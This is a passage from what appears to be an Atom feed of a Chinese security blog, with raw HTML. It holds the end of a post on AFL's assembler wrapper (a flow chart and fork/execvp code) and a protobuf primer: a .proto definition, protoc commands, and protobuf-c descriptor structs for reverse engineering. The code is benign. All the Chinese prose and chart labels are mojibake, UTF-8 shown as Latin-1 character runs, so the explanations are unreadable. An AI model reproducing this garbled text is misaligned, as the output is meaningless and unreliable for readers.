â†“</span><br><span class="line">æ£€æŸ¥å»¶è¿Ÿæ’æ¡©æ¡ä»¶ â†’ æ˜¯ â†’ æ’å…¥æ’æ¡©ä»£ç </span><br><span class="line">  â†“                     â†“</span><br><span class="line">è¾“å‡ºå½“å‰è¡Œ              æ›´æ–°è®¡æ•°å™¨</span><br><span class="line">  â†“                     â†“</span><br><span class="line">ç›´é€šæ¨¡å¼? â†’ æ˜¯ â†’ ç»§ç»­ä¸‹ä¸€è¡Œ</span><br><span class="line">  â†“</span><br><span class="line">æ£€æµ‹æ®µç±»å‹ â†’ .textæ®µ â†’ å¯ç”¨æ’æ¡©</span><br><span class="line">  â†“           å…¶ä»–æ®µ â†’ ç¦ç”¨æ’æ¡©</span><br><span class="line">æ£€æµ‹ç‰¹æ®Šæƒ…å†µ</span><br><span class="line">  â†“</span><br><span class="line">è·³è¿‡æ¡ä»¶æ£€æŸ¥ â†’ æ˜¯ â†’ ç»§ç»­ä¸‹ä¸€è¡Œ</span><br><span class="line">  â†“</span><br><span class="line">æŒ‡ä»¤è¡Œ? â†’ æ˜¯ â†’ æ¡ä»¶åˆ†æ”¯? â†’ æ˜¯ â†’ æ¦‚ç‡æ’æ¡©</span><br><span class="line">  â†“                        â†“</span><br><span class="line">æ ‡ç­¾è¡Œ? â†’ æ˜¯ â†’ åˆ†æ”¯æ ‡ç­¾? â†’ æ˜¯ â†’ æ ‡è®°å»¶è¿Ÿæ’æ¡©</span><br><span class="line">  â†“              å‡½æ•°æ ‡ç­¾? â†’ æ˜¯ â†’ æ ‡è®°å»¶è¿Ÿæ’æ¡©</span><br><span class="line">ç»§ç»­ä¸‹ä¸€è¡Œ</span><br><span class="line">  â†“</span><br><span class="line">æ–‡ä»¶ç»“æŸ? â†’ å¦ â†’ è¿”å›é€è¡Œè¯»å–</span><br><span class="line">  â†“</span><br><span class="line">æ·»åŠ ä¸»è¦è½½è·</span><br><span class="line">  â†“</span><br><span class="line">å…³é—­æ–‡ä»¶ï¼Œè¾“å‡ºç»Ÿè®¡</span><br><span class="line">  â†“</span><br><span class="line">ç»“æŸ</span><br></pre></td></tr></table></figure><p>ç„¶åå›åˆ°mainå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">execvp</span>(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line"><span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) <span class="built_in">unlink</span>(modified_file);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="built_in">WEXITSTATUS</span>(status));</span><br></pre></td></tr></table></figure><p>forkä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œ<code>as --64 -o /home/cyberangel/Desktop/test/exec_obj.o /tmp/.afl-27115-1673249415.s</code>å‘½ä»¤</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>éƒ¨åˆ†æ ·ä¾‹ä»¥åŠé˜…è¯»è¿‡ç¨‹ä¸­çš„å‚è€ƒæ¥è‡ªäº<a href="https://www.yuque.com/cyberangel">https://www.yuque.com/cyberangel</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;åŸºæœ¬æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#åŸºæœ¬æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬æ¦‚å¿µ&quot;&gt;&lt;/a&gt;åŸºæœ¬æ¦‚å¿µ&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;basic block(åŸºæœ¬å—)ã€edge(è¾¹)ã€ä»£ç è¦†ç›–ç‡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;edgeå°±è¢«ç”¨</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://s1nec-1o.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>protobufåˆæ¢</title>
    <link href="http://s1nec-1o.github.io/2025/05/13/protobuf%E5%88%9D%E6%8E%A2/"/>
    <id>http://s1nec-1o.github.io/2025/05/13/protobuf%E5%88%9D%E6%8E%A2/</id>
    <published>2025-05-13T12:35:17.000Z</published>
    <updated>2025-05-13T12:39:32.290Z</updated>
    
    <content type="html"><![CDATA[<p>Protobuf (Protocol Buffers) æ˜¯è°·æ­Œå¼€å‘çš„ä¸€æ¬¾æ— å…³å¹³å°ï¼Œæ— å…³è¯­è¨€ï¼Œå¯æ‰©å±•ï¼Œè½»é‡çº§é«˜æ•ˆçš„åºåˆ—åŒ–ç»“æ„çš„æ•°æ®æ ¼å¼ï¼Œç”¨äº<strong>å°†è‡ªå®šä¹‰æ•°æ®ç»“æ„åºåˆ—åŒ–æˆå­—èŠ‚æµï¼Œå’Œå°†å­—èŠ‚æµååºåˆ—åŒ–ä¸ºæ•°æ®ç»“æ„</strong>ã€‚æ‰€ä»¥å¾ˆé€‚åˆåšæ•°æ®å­˜å‚¨å’Œä¸ºä¸åŒè¯­è¨€ï¼Œä¸åŒåº”ç”¨ä¹‹é—´äº’ç›¸é€šä¿¡çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œåªè¦å®ç°ç›¸åŒçš„åè®®æ ¼å¼ï¼Œå³åç¼€ä¸ºprotoæ–‡ä»¶è¢«ç¼–è¯‘æˆä¸åŒçš„è¯­è¨€ç‰ˆæœ¬ï¼ŒåŠ å…¥å„è‡ªçš„é¡¹ç›®ä¸­ï¼Œè¿™æ ·ä¸åŒçš„è¯­è¨€å¯ä»¥è§£æå…¶å®ƒè¯­è¨€é€šè¿‡Protobufåºåˆ—åŒ–çš„æ•°æ®ã€‚ç›®å‰å®˜æ–¹æä¾›c++ï¼Œjavaï¼Œgoç­‰è¯­è¨€æ”¯æŒã€‚</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>é¦–å…ˆå®šä¹‰ä¸€ä¸ª.protoæ–‡ä»¶</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span>&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®è¦é€šè¿‡cæˆ–è€…pythonæ¥ä½¿ç”¨ï¼Œæ¥ä½¿ç”¨ç›¸åº”çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">protoc --c_out=. test.proto</span><br><span class="line">protoc --python_out=. test.proto</span><br></pre></td></tr></table></figure><p>c_outä¼šç”Ÿæˆä¸€ä¸ª<code>test.pb-c.c</code>å’Œ<code>test.pb-c.h</code>æ–‡ä»¶</p><p>python_outä¼šç”Ÿæˆä¸€ä¸ª<code>test_pb2.py</code>æ–‡ä»¶</p><h2 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Devicemsg *</span><br><span class="line">       <span class="title function_">devicemsg__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Devicemsg *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;devicemsg__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿”å›çš„æ˜¯ä¸€ä¸ªDevicemsgæŒ‡é’ˆï¼Œä¸‰ä¸ªå‚æ•°ï¼š</p><ul><li>allocatorä¸€èˆ¬ç½®0å³å¯</li><li>lenæ˜¯é•¿åº¦ï¼Œé€šè¿‡<code>devicemsg__get_packed_size</code>è·å–å³å¯</li><li>dataå°±æ˜¯æŒ‡å‘åºåˆ—åŒ–çš„å­—èŠ‚æµ</li></ul><p>å¯ä»¥å‘ç°<code>devicemsg_unpack</code>å°±æ˜¯<code>protobuf_c_message_unpack</code>çš„å°è£…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor devicemsg__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Devicemsg),</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  devicemsg__field_descriptors,</span><br><span class="line">  devicemsg__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  devicemsg__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) devicemsg__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä½“çš„å®šä¹‰åœ¨æºç ä¸­æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line"><span class="type">uint32_t</span>magic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"><span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*short_name;</span><br><span class="line"><span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*c_name;</span><br><span class="line"><span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*package_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Size in bytes of the C structure representing an instance of this</span></span><br><span class="line"><span class="comment"> * type of message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span>sizeof_message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_fields;</span><br><span class="line"><span class="comment">/** Field descriptors, sorted by tag number. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCFieldDescriptor*fields;</span><br><span class="line"><span class="comment">/** Used for looking up fields by name. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span>*fields_sorted_by_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `field_ranges`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_field_ranges;</span><br><span class="line"><span class="comment">/** Used for looking up fields by id. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCIntRange*field_ranges;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Message initialisation function. */</span></span><br><span class="line">ProtobufCMessageInitmessage_init;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved1;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>magicï¼Œä¸€èˆ¬ä¸º0x28AAEEF9</li><li>n_fieldsï¼Œæ˜¯åŸæœ¬çš„massageæœ‰å¤šå°‘å‚æ•°</li><li>fieldsï¼Œè¿™ä¸ªæŒ‡å‘messageå†…æ‰€æœ‰å‚æ•°ç±»å‹ç»„æˆçš„ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥å€Ÿæ­¤é€†å‘åˆ†æmessageç»“æ„ã€‚</li></ol><p>å¦‚æœéœ€è¦å…·ä½“åˆ†æä¸€ä¸ªç»“æ„ä½“çš„ç»„æˆ,åªéœ€è¦å…³æ³¨<code>n_fields</code>ä¸<code>fields</code></p><p>åœ¨æœ¬ä¾‹ä¸­è¿™æ ·å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor devicemsg__field_descriptors[<span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;actionid&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, actionid),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgidx&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgidx),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgsize&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgsize),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgcontent&quot;</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgcontent),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>nameï¼Œåå­—ï¼Œå˜é‡å</li><li>idï¼Œåºå·ï¼Œå³åœ¨messageç»“æ„ä½“ä¸­çš„é¡ºåºï¼ˆç­‰ä»·äºä½ç½®ï¼‰</li><li>labelï¼Œå‰é¢æ ‡è®°çš„requiredç­‰æ ‡è®°</li><li>typeï¼Œæ•°æ®ç±»å‹ï¼Œstringè¿˜æ˜¯int64ç­‰</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"> PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line"> PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line"> PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line"> PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line"> PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line"> PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line"> PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><p>è²Œä¼¼æ˜¯0-0Ahé¡ºåºçš„å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"> <span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line"> PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">  * more than one).</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">  * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">  * preserved.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">  * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">  